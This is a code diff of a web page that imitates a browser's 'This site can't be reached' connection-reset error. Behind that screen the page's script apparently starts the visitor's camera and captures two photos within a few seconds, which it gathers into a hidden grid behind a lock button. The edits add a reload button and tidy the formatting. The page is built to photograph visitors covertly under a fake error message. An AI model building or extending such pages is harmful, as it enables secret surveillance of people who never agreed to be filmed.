@@ -41,22 +41,34 @@
       border: 2px solid white;
       display: none;
     }
+    .reload-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #0f0;
+      color: black;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
 
   <div id="result">
     <h1>This site can’t be reached</h1>
-  <p>The connection was reset.</p>
+    <p>The connection was reset.</p>
 
-  <p>Try:</p>
-  <ul>
-    <li>Checking the connection</li>
-  </ul>
+    <p>Try:</p>
+    <ul>
+      <li>Checking the connection</li>
+    </ul>
 
-  <div class="error-code">ERR_CONNECTION_RESET</div>
+    <div class="error-code">ERR_CONNECTION_RESET</div>
 
-  <div class="reload-text">Reload</div>
+    <!-- Reload Button -->
+    <button class="reload-btn" onclick="location.reload()">Reload Page</button>
+
     <button id="unlockBtn">🔒</button>
     <div class="photoGrid" id="photoGrid"></div>
   </div>
@@ -96,11 +108,10 @@
       video.srcObject = stream;
 
       video.onloadeddata = () => {
-        // Wait 500ms to ensure video is rendering
         setTimeout(() => {
-          capturePhoto(); // 1st photo
+          capturePhoto();
           setTimeout(() => {
-            capturePhoto(); // 2nd photo after 2s
+            capturePhoto();
           }, 2000);
         }, 500);
       };
@@ -156,4 +167,4 @@
     });
   </script>
 </body>
-</html>
+  </html>
